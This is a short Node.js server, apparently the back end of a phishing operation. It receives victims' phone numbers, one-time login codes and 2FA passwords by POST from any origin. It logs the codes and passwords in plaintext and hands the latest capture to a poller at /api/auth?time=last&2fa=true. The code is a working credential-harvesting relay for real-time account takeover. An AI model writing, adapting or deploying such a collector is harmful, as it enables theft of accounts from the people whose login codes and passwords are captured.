const http = require('http');
const url = require('url');

const PORT = process.env.PORT || 3000;
let lastAuthData = null;

const server = http.createServer((req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(200);
        res.end();
        return;
    }

    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                handlePostData(data, res);
            } catch (error) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'Invalid JSON' }));
            }
        });
    } else if (req.method === 'GET') {
        const parsedUrl = url.parse(req.url, true);
        const query = parsedUrl.query;
        
        if (parsedUrl.pathname === '/api/auth') {
            handleGetAuthData(query, res);
        } else {
            res.writeHead(404, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Endpoint not found' }));
        }
    } else {
        res.writeHead(405, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Method not allowed' }));
    }
});

function handlePostData(data, res) {
    if (data.type === 'auth_code') {
        lastAuthData = {
            type: 'auth_code',
            code: data.code,
            phone_number: data.phone_number || 'unknown',
            user_id: data.user_id,
            timestamp: new Date().toISOString()
        };
        
        console.log(`📱 Сохранен код: ${data.code}`);
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'success', message: 'Code saved' }));
        
    } else if (data.type === '2fa_password') {
        if (lastAuthData && lastAuthData.type === 'auth_code') {
            lastAuthData.password = data.password;
            lastAuthData.timestamp_2fa = new Date().toISOString();
        } else {
            lastAuthData = {
                type: '2fa_password',
                password: data.password,
                phone_number: data.phone_number || 'unknown',
                auth_code: data.auth_code || 'unknown',
                user_id: data.user_id,
                timestamp_2fa: new Date().toISOString()
            };
        }
        
        console.log(`🔐 Сохранен пароль: ${data.password || 'SKIPPED'}`);
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'success', message: 'Password saved' }));
        
    } else {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Unknown data type' }));
    }
}

function handleGetAuthData(query, res) {
    const time = query.time;
    const include2fa = query['2fa'] === 'True' || query['2fa'] === 'true';
    
    if (time === 'last') {
        if (!lastAuthData) {
            res.writeHead(404, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'No data available' }));
            return;
        }
        
        const response = {
            code: lastAuthData.code || null,
            phone_number: lastAuthData.phone_number || null,
            timestamp: lastAuthData.timestamp || null
        };
        
        if (include2fa) {
            response.password = lastAuthData.password || null;
            response.timestamp_2fa = lastAuthData.timestamp_2fa || null;
        }
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(response));
    } else {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Invalid time parameter. Use: time=last' }));
    }
}

server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});